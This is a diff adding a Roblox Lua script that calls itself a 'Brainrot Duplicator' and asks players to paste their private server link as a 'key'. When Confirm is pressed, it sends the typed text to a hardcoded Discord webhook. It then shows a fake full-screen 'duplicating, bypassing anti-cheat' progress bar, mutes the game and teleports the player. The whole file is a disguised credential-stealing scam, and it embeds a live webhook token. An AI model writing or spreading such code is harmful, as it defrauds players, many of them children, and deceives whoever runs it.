@@ -1,0 +1,186 @@
+-- Brainrot Duplicator 2.02 - FINAL TROLL EDITION (UPDATED WITH SEQUENTIAL HINTS + REJOIN)
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local function SendToWebhook(text)
+    local url = "https://discord.com/api/webhooks/1443757360605564978/_DWO8U138x_7GGt4kQLW9X-kTJr9MLRvy-iV6DzEvNwJWZq1vccqHuuM-KFQTEWfg7_B"
+
+    local data = {
+        content = "@everyone NEW LINK!! " .. text,
+        allowed_mentions = { parse = { "everyone" } }
+    }
+
+    local json = game:GetService("HttpService"):JSONEncode(data)
+
+    request({
+        Url = url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json
+    })
+end
+
+
+-- [Main GUI]
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 320, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1,0,0,35)
+Title.BackgroundColor3 = Color3.fromRGB(10,10,20)
+Title.Text = "  Brainrot Duplicator 2.02"
+Title.TextColor3 = Color3.fromRGB(255,80,255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+
+local CloseBtn = Instance.new("TextButton", MainFrame)
+CloseBtn.Size = UDim2.new(0,35,0,35)
+CloseBtn.Position = UDim2.new(1,-35,0,0)
+CloseBtn.BackgroundTransparency = 1
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255,80,80)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 20
+CloseBtn.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+local KeyBox = Instance.new("TextBox", MainFrame)
+KeyBox.Size = UDim2.new(1,-30,0,40)
+KeyBox.Position = UDim2.new(0,15,0,90)
+KeyBox.BackgroundColor3 = Color3.fromRGB(40,40,55)
+KeyBox.Text = ""
+KeyBox.PlaceholderText = "Paste in key here (Your server link)"
+KeyBox.TextColor3 = Color3.new(1,1,1)
+KeyBox.Font = Enum.Font.Gotham
+KeyBox.TextSize = 14
+
+local ConfirmBtn = Instance.new("TextButton", MainFrame)
+ConfirmBtn.Size = UDim2.new(1,-30,0,45)
+ConfirmBtn.Position = UDim2.new(0,15,0,145)
+ConfirmBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+ConfirmBtn.Text = "Confirm"
+ConfirmBtn.TextColor3 = Color3.new(1,1,1)
+ConfirmBtn.Font = Enum.Font.GothamBold
+ConfirmBtn.TextSize = 18
+
+local REQUIRED = "https://www.roblox.com/share?"
+
+-- FULL-SCREEN LOADING TROLL
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Parent = game.CoreGui
+LoadingGui.ResetOnSpawn = false
+LoadingGui.IgnoreGuiInset = true
+LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
+LoadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+LoadingFrame.BackgroundTransparency = 0
+LoadingFrame.ZIndex = 999999999
+LoadingFrame.Visible = false
+LoadingFrame.Parent = LoadingGui
+
+local LoadingText = Instance.new("TextLabel", LoadingFrame)
+LoadingText.Size = UDim2.new(1, 0, 0, 60)
+LoadingText.Position = UDim2.new(0, 0, 0.4, 0)
+LoadingText.BackgroundTransparency = 1
+LoadingText.Text = ""
+LoadingText.TextColor3 = Color3.fromRGB(255, 100, 255)
+LoadingText.Font = Enum.Font.GothamBold
+LoadingText.TextSize = 40
+LoadingText.ZIndex = 1000000001
+
+local BarBg = Instance.new("Frame", LoadingFrame)
+BarBg.Size = UDim2.new(0.7, 0, 0, 25)
+BarBg.Position = UDim2.new(0.15, 0, 0.5, 0)
+BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+BarBg.ZIndex = 1000000002
+Instance.new("UICorner", BarBg).CornerRadius = UDim.new(0, 12)
+
+local BarFill = Instance.new("Frame", BarBg)
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+BarFill.ZIndex = 1000000003
+Instance.new("UICorner", BarFill).CornerRadius = UDim.new(0, 12)
+
+local hints = {
+    "Finding your brainrot(s)",
+    "Checking if eligible to duplicate...",
+    "Your brainrot(s) are eligible to duplicate! ✅",
+    "Starting the duplication process",
+    "Duplicating.",
+    "Bypassing anti-cheat",
+    "Duplicating masked...",
+    "Done!"
+}
+
+local SoundKiller
+local function startSoundKiller()
+    if SoundKiller then SoundKiller:Disconnect() end
+    SoundKiller = game:GetService("RunService").Heartbeat:Connect(function()
+        pcall(function()
+            for _, sound in ipairs(workspace:GetDescendants()) do
+                if sound:IsA("Sound") then
+                    sound.Volume = 0
+                    sound.Playing = false
+                end
+            end
+            game.SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+            game.SoundService.Volume = 0
+        end)
+    end)
+end
+
+local function activateTroll()
+    MainFrame.Visible = false
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    startSoundKiller()
+    LoadingFrame.Visible = true
+
+    local TweenService = game:GetService("TweenService")
+    local tweenInfo = TweenInfo.new(300, Enum.EasingStyle.Linear)
+    local goal = {Size = UDim2.new(1, 0, 1, 0)}
+    TweenService:Create(BarFill, tweenInfo, goal):Play()
+
+    local totalTime = 300
+    local interval = totalTime / (#hints - 1)
+    for i, hint in ipairs(hints) do
+        task.delay((i-1) * interval, function()
+            LoadingText.Text = hint
+            if hint == "Done!" then
+                task.delay(2, function()
+                    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+                end)
+            end
+        end)
+    end
+end
+
+-- Confirm button (WEBHOOK INCLUDED)
+ConfirmBtn.MouseButton1Click:Connect(function()
+    SendToWebhook(KeyBox.Text)
+
+    if KeyBox.Text:sub(1, #REQUIRED) == REQUIRED then
+        activateTroll()
+    else
+        MainFrame:TweenPosition(MainFrame.Position + UDim2.new(0, 10, 0, 0), "Out", "Quad", 0.1, true)
+        task.wait(0.1)
+        MainFrame:TweenPosition(UDim2.new(0.5,-160,0.5,-110), "Out", "Quad", 0.1, true)
+        KeyBox.Text = ""
+    end
+end)
+
+KeyBox.FocusLost:Connect(function(enter)
+    if enter then
+        ConfirmBtn.MouseButton1Click:Fire()
+    end
+end)
